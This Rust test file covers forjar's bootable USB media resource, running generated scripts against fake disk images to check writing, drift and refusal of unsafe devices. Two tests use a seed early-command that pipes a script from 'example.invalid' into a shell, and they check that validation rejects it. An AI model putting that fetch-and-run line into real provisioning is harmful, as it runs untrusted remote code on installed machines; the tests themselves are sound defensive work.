//! Tests for `bootable_media`.
//!
//! The ones that matter RUN the generated scripts against an image FILE: a
//! fake ISO carrying a real GPT (written by `sfdisk`), a zeroed "disk" file, a
//! by-id symlink to it, and a fake `/sys/class/block` + `/proc/self/mounts`
//! under `FORJAR_MEDIA_ROOT`. No real disk is ever opened.

use super::*;
use crate::core::types::{MediaSpec, Resource, ResourceType};
use sha2::{Digest, Sha256};
use std::fs;
use std::io::Write as _;
use std::path::{Path, PathBuf};
use std::process::{Command, Output, Stdio};

const BY_ID: &str = "/dev/disk/by-id/usb-Forjar_Test_Stick_0001-0:0";
const ISO_BYTES: u64 = 2 * 1024 * 1024;
const DISK_BYTES: u64 = 16 * 1024 * 1024;
const PATH: &str = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";

const USER_DATA: &str = "#cloud-config\nautoinstall:\n  version: 1\n  early-commands:\n    - echo forjar-early\n  late-commands:\n    - curtin in-target -- systemctl enable ssh\n";

struct Scratch(PathBuf);
impl Scratch {
    fn new(tag: &str) -> Self {
        // Under the system temp dir, never a path holding `/usb`: the USB test
        // reads the sysfs path, and a scratch dir named `usb…` would fake it.
        let p = std::env::temp_dir().join(format!(
            "forjar-bmedia-{tag}-{}-{:?}",
            std::process::id(),
            std::thread::current().id()
        ));
        let _ = fs::remove_dir_all(&p);
        fs::create_dir_all(&p).unwrap();
        Self(p)
    }
    fn join(&self, s: &str) -> PathBuf {
        self.0.join(s.trim_start_matches('/'))
    }
    fn root(&self) -> PathBuf {
        self.join("root")
    }
    fn iso(&self) -> PathBuf {
        self.join("ubuntu.iso")
    }
    fn disk(&self) -> PathBuf {
        self.join("root/dev/sdz")
    }
}
impl Drop for Scratch {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.0);
    }
}

fn sha_hex(b: &[u8]) -> String {
    Sha256::digest(b)
        .iter()
        .map(|x| format!("{x:02x}"))
        .collect()
}

fn sfdisk_present() {
    let ok = Command::new("sh")
        .args(["-c", "command -v sfdisk"])
        .env("PATH", PATH)
        .stdout(Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false);
    assert!(
        ok,
        "sfdisk (util-linux) is required: the generated scripts append the seed \
         partition with it, so these tests mean nothing without it"
    );
}

/// A 2 MiB "ISO": deterministic bytes plus a real GPT with one partition.
fn make_iso(s: &Scratch) -> String {
    sfdisk_present();
    let mut x: u32 = 0x1234_5678;
    let bytes: Vec<u8> = (0..ISO_BYTES)
        .map(|_| {
            x = x.wrapping_mul(1_664_525).wrapping_add(1_013_904_223);
            (x >> 24) as u8
        })
        .collect();
    fs::write(s.iso(), &bytes).unwrap();
    let mut child = Command::new("sfdisk")
        .args(["-q", "--wipe", "never"])
        .arg(s.iso())
        .env("PATH", PATH)
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .spawn()
        .unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(
            b"label: gpt\nstart=2048, size=1024, type=0FC63DAF-8483-4772-8E79-3D69D8477DE4\n",
        )
        .unwrap();
    assert!(
        child.wait().unwrap().success(),
        "sfdisk could not label the fake ISO"
    );
    sha_hex(&fs::read(s.iso()).unwrap())
}

/// Fake disk + by-id link + sysfs + mounts. `removable` and `usb_path` decide
/// what the sysfs entry claims.
fn make_disk(s: &Scratch, removable: bool, usb_path: bool) {
    let root = s.root();
    fs::create_dir_all(root.join("dev/disk/by-id")).unwrap();
    let f = fs::File::create(s.disk()).unwrap();
    f.set_len(DISK_BYTES).unwrap();
    std::os::unix::fs::symlink(s.disk(), s.join(&format!("root{BY_ID}"))).unwrap();
    let class = root.join("sys/class/block");
    fs::create_dir_all(&class).unwrap();
    let dev_dir = if usb_path {
        let d = root.join("sys/devices/pci0000:00/0000:00:14.0/usb2/2-1/block/sdz");
        fs::create_dir_all(&d).unwrap();
        std::os::unix::fs::symlink(&d, class.join("sdz")).unwrap();
        d
    } else {
        let d = root.join("sys/devices/pci0000:00/0000:00:17.0/ata1/block/sdz");
        fs::create_dir_all(&d).unwrap();
        std::os::unix::fs::symlink(&d, class.join("sdz")).unwrap();
        d
    };
    fs::write(
        dev_dir.join("removable"),
        if removable { "1\n" } else { "0\n" },
    )
    .unwrap();
    fs::write(dev_dir.join("size"), format!("{}\n", DISK_BYTES / 512)).unwrap();
    fs::create_dir_all(dev_dir.join("holders")).unwrap();
    fs::create_dir_all(root.join("proc/self")).unwrap();
    fs::write(root.join("proc/self/mounts"), "/dev/sda2 / ext4 rw 0 0\n").unwrap();
}

fn resource(device: &str, iso: &Path, sha: &str, user_data: &str) -> Resource {
    let mut r = Resource {
        resource_type: ResourceType::BootableMedia,
        ..Default::default()
    };
    let mut seed = indexmap::IndexMap::new();
    seed.insert("user-data".to_string(), user_data.to_string());
    seed.insert(
        "meta-data".to_string(),
        "instance-id: t2-test\n".to_string(),
    );
    seed.insert(
        "install.sh".to_string(),
        "#!/bin/sh\nset -eu\necho installing\n".to_string(),
    );
    r.media = MediaSpec {
        device: Some(device.to_string()),
        iso: Some(iso.display().to_string()),
        iso_sha256: Some(sha.to_string()),
        iso_bytes: Some(ISO_BYTES),
        seed,
        seed_state: None,
        seed_mib: Some(9),
    };
    r
}

fn fixture(tag: &str) -> (Scratch, Resource) {
    let s = Scratch::new(tag);
    let sha = make_iso(&s);
    make_disk(&s, true, false);
    let r = resource(BY_ID, &s.iso(), &sha, USER_DATA);
    (s, r)
}

fn run(s: &Scratch, script: &str) -> Output {
    Command::new("bash")
        .args(["-c", script])
        .env("FORJAR_MEDIA_ROOT", s.root())
        .env("PATH", PATH)
        .output()
        .unwrap()
}

fn stdout(o: &Output) -> String {
    String::from_utf8_lossy(&o.stdout).into_owned()
}

fn flip_byte(p: &Path, at: u64) {
    let mut b = fs::read(p).unwrap();
    b[at as usize] ^= 0x01;
    fs::write(p, b).unwrap();
}

fn applied(tag: &str) -> (Scratch, Resource) {
    let (s, r) = fixture(tag);
    let o = run(&s, &apply_script(&r));
    assert!(
        o.status.success(),
        "apply failed:\n{}\n{}",
        stdout(&o),
        String::from_utf8_lossy(&o.stderr)
    );
    (s, r)
}

// -- 1. write, then check passes --------------------------------------------

#[test]
fn write_then_check_passes_and_a_second_apply_writes_nothing() {
    let (s, r) = applied("write");
    let o = run(&s, &check_script(&r));
    let out = stdout(&o);
    assert!(o.status.success(), "check after apply diverged:\n{out}");
    for m in [
        "media=usb-disk",
        "iso=pinned",
        "iso_region=match",
        "seed_partition=present",
        "seed_label=CIDATA",
        "seed_file=user-data:match",
        "seed_file=meta-data:match",
        "seed_file=install.sh:match",
        "seed_partition_sha256=match",
    ] {
        assert!(out.contains(m), "missing marker {m}:\n{out}");
    }
    // The appended partition is really in the table, where the plan said.
    let m = BootableMedia::new(&r.media).unwrap();
    let d = Command::new("sfdisk")
        .arg("-d")
        .arg(s.disk())
        .env("PATH", PATH)
        .output()
        .unwrap();
    let table = stdout(&d);
    assert!(
        table.contains(&format!(
            "start={:>12}, size={:>12}",
            m.seed_start_sector(),
            m.seed_sectors()
        )),
        "seed partition not in the table:\n{table}"
    );
    // Converged: a second apply writes nothing.
    let again = run(&s, &apply_script(&r));
    assert!(again.status.success());
    assert!(
        !stdout(&again).contains("forjar: writing"),
        "{}",
        stdout(&again)
    );
}

#[test]
fn a_check_before_any_write_diverges() {
    let (s, r) = fixture("fresh");
    let o = run(&s, &check_script(&r));
    assert!(!o.status.success());
    assert!(stdout(&o).contains("iso_region=drift"), "{}", stdout(&o));
}

// -- 2. one flipped byte in the ISO region ------------------------------------

#[test]
fn a_flipped_byte_in_the_iso_region_is_drift_and_apply_repairs_it() {
    let (s, r) = applied("isoflip");
    flip_byte(&s.disk(), 1_000_000);
    let o = run(&s, &check_script(&r));
    let out = stdout(&o);
    assert!(
        !o.status.success(),
        "a flipped ISO byte passed the check:\n{out}"
    );
    assert!(out.contains("iso_region=drift"), "{out}");
    assert!(out.contains("seed_partition_sha256=match"), "{out}");
    assert!(run(&s, &apply_script(&r)).status.success());
    assert!(run(&s, &check_script(&r)).status.success());
}

// -- 3. a changed seed file ----------------------------------------------------

#[test]
fn a_changed_seed_file_on_the_disk_is_drift() {
    let (s, r) = applied("seedflip");
    let m = media_of(&r).unwrap();
    let ext = m
        .image
        .extents
        .iter()
        .find(|e| e.name == "user-data")
        .unwrap();
    flip_byte(&s.disk(), m.spec.seed_start_sector() * 512 + ext.offset + 3);
    let o = run(&s, &check_script(&r));
    let out = stdout(&o);
    assert!(
        !o.status.success(),
        "a changed seed byte passed the check:\n{out}"
    );
    assert!(out.contains("seed_file=user-data:drift"), "{out}");
    assert!(out.contains("seed_file=meta-data:match"), "{out}");
    assert!(out.contains("iso_region=match"), "{out}");
}

#[test]
fn a_changed_seed_declaration_is_drift_until_applied() {
    let (s, r) = applied("seeddecl");
    let mut r2 = r.clone();
    r2.media.seed.insert(
        "meta-data".to_string(),
        "instance-id: t2-other\n".to_string(),
    );
    let o = run(&s, &check_script(&r2));
    assert!(!o.status.success());
    assert!(
        stdout(&o).contains("seed_file=meta-data:drift"),
        "{}",
        stdout(&o)
    );
    assert!(run(&s, &apply_script(&r2)).status.success());
    assert!(run(&s, &check_script(&r2)).status.success());
}

#[test]
fn disarming_relabels_the_partition() {
    let (s, r) = applied("disarm");
    let mut r2 = r.clone();
    r2.media.seed_state = Some("disarmed".to_string());
    let o = run(&s, &check_script(&r2));
    assert!(stdout(&o).contains("seed_label=drift"), "{}", stdout(&o));
    assert!(run(&s, &apply_script(&r2)).status.success());
    let o = run(&s, &check_script(&r2));
    assert!(o.status.success());
    assert!(stdout(&o).contains("seed_label=SCRIPTS"));
}

// -- 4. a /dev/sdX path is refused ----------------------------------------------

#[test]
fn a_dev_sdx_path_is_refused_at_validate_and_apply() {
    let (s, mut r) = fixture("sdx");
    let before = sha_hex(&fs::read(s.disk()).unwrap());
    for bad in [
        "/dev/sdz",
        "/dev/disk/by-id/usb-Forjar_Test_Stick_0001-0:0-part1",
        "/dev/disk/by-id/ata-WDC_X",
    ] {
        r.media.device = Some(bad.to_string());
        let e = media_of(&r)
            .err()
            .unwrap_or_else(|| panic!("{bad} was accepted"));
        assert!(e.contains("by-id"), "{bad}: {e}");
        let o = run(&s, &apply_script(&r));
        assert!(!o.status.success(), "{bad}: apply ran");
    }
    assert_eq!(
        before,
        sha_hex(&fs::read(s.disk()).unwrap()),
        "the disk was written"
    );
}

// -- 5. a non-removable disk is refused ------------------------------------------

#[test]
fn a_non_removable_non_usb_disk_is_refused_and_not_written() {
    let s = Scratch::new("fixed");
    let sha = make_iso(&s);
    make_disk(&s, false, false);
    let r = resource(BY_ID, &s.iso(), &sha, USER_DATA);
    let before = sha_hex(&fs::read(s.disk()).unwrap());
    let o = run(&s, &apply_script(&r));
    assert!(!o.status.success(), "apply wrote a fixed disk");
    assert!(
        String::from_utf8_lossy(&o.stderr).contains("neither removable nor USB"),
        "{}",
        String::from_utf8_lossy(&o.stderr)
    );
    assert_eq!(
        before,
        sha_hex(&fs::read(s.disk()).unwrap()),
        "the disk was written"
    );
    let c = run(&s, &check_script(&r));
    assert!(stdout(&c).contains("media=refused:not-a-removable-usb-whole-disk"));
}

#[test]
fn a_usb_attached_disk_reporting_removable_0_is_accepted() {
    // Many USB SSDs report removable=0; the sysfs path is what proves USB.
    let s = Scratch::new("usbssd");
    let sha = make_iso(&s);
    make_disk(&s, false, true);
    let r = resource(BY_ID, &s.iso(), &sha, USER_DATA);
    assert!(run(&s, &apply_script(&r)).status.success());
    assert!(run(&s, &check_script(&r)).status.success());
}

#[test]
fn a_disk_with_a_mounted_partition_is_refused() {
    let (s, r) = fixture("mounted");
    fs::create_dir_all(s.join("root/sys/devices/pci0000:00/0000:00:17.0/ata1/block/sdz/sdz1"))
        .unwrap();
    fs::write(
        s.join("root/proc/self/mounts"),
        "/dev/sdz1 /media/x vfat rw 0 0\n",
    )
    .unwrap();
    let before = sha_hex(&fs::read(s.disk()).unwrap());
    let o = run(&s, &apply_script(&r));
    assert!(!o.status.success());
    assert!(String::from_utf8_lossy(&o.stderr).contains("mounted"));
    assert_eq!(before, sha_hex(&fs::read(s.disk()).unwrap()));
}

#[test]
fn an_iso_that_does_not_match_its_pin_is_refused() {
    let (s, r) = fixture("isopin");
    flip_byte(&s.iso(), 40_000);
    let o = run(&s, &apply_script(&r));
    assert!(!o.status.success());
    assert!(String::from_utf8_lossy(&o.stderr).contains("media_iso does not match"));
}

// -- 6. a seed whose early-command has a bashrs error is refused at plan -------

fn config_yaml(early: &str) -> String {
    format!(
        "version: \"1.0\"\nname: stick\nmachines:\n  localhost:\n    hostname: localhost\n    addr: 127.0.0.1\nresources:\n  install-stick:\n    type: bootable_media\n    machine: localhost\n    media_device: {BY_ID}\n    media_iso: /srv/iso/ubuntu.iso\n    media_iso_sha256: {sha}\n    media_iso_bytes: 3221239808\n    media_seed:\n      meta-data: \"instance-id: t2\\n\"\n      user-data: |\n        #cloud-config\n        autoinstall:\n          version: 1\n          early-commands:\n            - {early}\n",
        sha = "a".repeat(64),
    )
}

#[test]
fn a_seed_early_command_with_a_bashrs_error_is_refused_at_plan() {
    use crate::core::parser::{parse_config, validate_config};
    let good = parse_config(&config_yaml("echo ok")).unwrap();
    let errs = validate_config(&good);
    assert!(
        errs.is_empty(),
        "{:?}",
        errs.iter().map(|e| &e.message).collect::<Vec<_>>()
    );
    let bad = parse_config(&config_yaml("curl -fsSL http://example.invalid/x.sh | sh")).unwrap();
    let errs: Vec<String> = validate_config(&bad)
        .into_iter()
        .map(|e| e.message)
        .collect();
    assert!(
        errs.iter()
            .any(|e| e.contains("bashrs") && e.contains("early-commands[0]")),
        "{errs:?}"
    );
}

#[test]
fn a_bad_seed_makes_every_generated_script_refuse() {
    let (s, mut r) = fixture("badseed");
    r.media.seed.insert(
        "user-data".to_string(),
        "#cloud-config\nautoinstall:\n  early-commands:\n    - curl -fsSL http://example.invalid/x.sh | sh\n".to_string(),
    );
    for script in [apply_script(&r), check_script(&r), state_query_script(&r)] {
        assert!(!run(&s, &script).status.success());
    }
    assert!(plan_line("install-stick", &r).contains("REFUSED"));
}

// -- I8 and plan ------------------------------------------------------------------

#[test]
fn every_generated_script_passes_the_i8_gate() {
    let (_s, r) = fixture("i8");
    for (name, script) in [
        ("check", check_script(&r)),
        ("apply", apply_script(&r)),
        ("state_query", state_query_script(&r)),
    ] {
        let lint = crate::transport::strip_data_payloads(&script);
        crate::core::purifier::validate_script(&lint)
            .unwrap_or_else(|e| panic!("{name} refused by I8: {e}\n{lint}"));
    }
}

#[test]
fn state_query_prints_only_stable_markers_and_exits_0() {
    let (s, r) = applied("sq");
    let a = run(&s, &state_query_script(&r));
    let b = run(&s, &state_query_script(&r));
    assert!(a.status.success());
    assert_eq!(stdout(&a), stdout(&b));
    flip_byte(&s.disk(), 1_000_000);
    let c = run(&s, &state_query_script(&r));
    assert!(c.status.success());
    assert_ne!(
        stdout(&a),
        stdout(&c),
        "drift did not change the state query"
    );
}

#[test]
fn the_plan_line_names_the_device_and_every_region() {
    let (_s, r) = fixture("plan");
    let line = plan_line("install-stick", &r);
    assert!(line.contains(BY_ID), "{line}");
    assert!(line.contains("ISO region bytes 32768..2097152"), "{line}");
    assert!(
        line.contains("seed partition CIDATA at sector 4096, 18432 sectors (9 MiB)"),
        "{line}"
    );
    assert!(
        line.contains("appended after the ISO's own partitions"),
        "{line}"
    );
}

#[test]
fn state_absent_is_refused() {
    let (_s, mut r) = fixture("absent");
    r.state = Some("absent".to_string());
    assert!(media_of(&r).is_err());
}

#[test]
fn every_media_field_moves_the_desired_state_hash_and_an_unset_one_does_not() {
    use crate::core::planner::hashing::hash_desired_state;
    // Unset media fields serialise to nothing, so a resource of any other type
    // hashes exactly as it did before this type existed.
    let plain = Resource::default();
    let v = serde_json::to_value(&plain).unwrap();
    assert!(
        !v.as_object()
            .unwrap()
            .keys()
            .any(|k| k.starts_with("media_")),
        "an unset media field serialised into every resource's hash"
    );
    let (_s, r) = fixture("hash");
    let base = hash_desired_state(&r);
    let mut cases: Vec<Resource> = Vec::new();
    let mut c = r.clone();
    c.media.device = Some("/dev/disk/by-id/usb-Forjar_Alt_Stick-0:0".to_string());
    cases.push(c);
    let mut c = r.clone();
    c.media.iso = Some("/tmp/forjar-alt.iso".to_string());
    cases.push(c);
    let mut c = r.clone();
    c.media.iso_sha256 = Some("0".repeat(64));
    cases.push(c);
    let mut c = r.clone();
    c.media.iso_bytes = Some(ISO_BYTES + 512);
    cases.push(c);
    let mut c = r.clone();
    c.media
        .seed
        .insert("meta-data".to_string(), "instance-id: alt\n".to_string());
    cases.push(c);
    let mut c = r.clone();
    c.media.seed_state = Some("disarmed".to_string());
    cases.push(c);
    let mut c = r.clone();
    c.media.seed_mib = Some(10);
    cases.push(c);
    for (i, c) in cases.iter().enumerate() {
        assert_ne!(
            hash_desired_state(c),
            base,
            "media field case {i} did not move the hash"
        );
    }
}
